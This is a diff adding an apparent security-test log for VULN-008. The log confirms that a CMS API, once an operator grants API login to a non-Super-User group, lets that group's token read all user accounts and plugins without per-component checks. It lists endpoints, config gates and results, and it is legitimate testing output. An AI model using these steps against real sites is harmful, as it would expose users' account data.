@@ -1,0 +1,22 @@
+========================================================================
+VULN-008: API authorization structurally coarser than the UI
+target: http://localhost:34931
+========================================================================
+[INFO] ApiDispatcher never calls checkAccess(); reads apply no per-component gate / state filter
+[STEP] BASELINE — mint a Super-User (admin) API token and read list endpoints
+[INFO]   SU /users -> HTTP 200 (data items: 7); /content/articles?filter[state]=-2 -> HTTP 200 (no state restriction enforced)
+[PROOF] SU token reads the API and the admin list model accepts filter[state]=-2 (trashed) with no publication-state restriction
+[STEP] BASELINE — create a non-SU Administrator (group 7) and mint its token
+[INFO]   group-7 token /users (baseline, core.login.api SU-only) -> HTTP 401
+[PROOF] group-7 token REJECTED at baseline -> API is Super-User-only = the INTENDED posture
+[STEP] WIDENED CONFIG — operator grants API access to group 7 (the finding's non-default action)
+[INFO] two gates must be widened: token-plugin allowedUserGroups (default [8]) AND core.login.api (default group 8)
+[SETUP] allowedUserGroups += group 7 AND core.login.api granted to group 7 (both reverted later)
+[INFO]   group-7 token /users -> HTTP 200 (data items: 8)
+[INFO]   group-7 token /plugins -> HTTP 200 (data items: 20)
+[INFO]   group-7 token /content/articles?filter[state]=-2 -> HTTP 200 (data items: 0)
+[PROOF] the same group-7 token now reads /users (all accounts: email/block/lastvisit) AND /plugins (every plugin + state) with NO per-component core.manage gate -> broken function-level authorization / excessive data exposure
+[SETUP] both gates reverted; core.login.api still grants group 7: False
+
+[OK] baseline is SU-only (INTENDED); granting core.login.api to a non-SU group yields cross-component read access with no per-component gate (BFLA)
+==> VULN-008: CONFIRMED — widened-config BFLA: non-SU group reads every component via the API (no per-component gate); baseline INTENDED (SU-only)
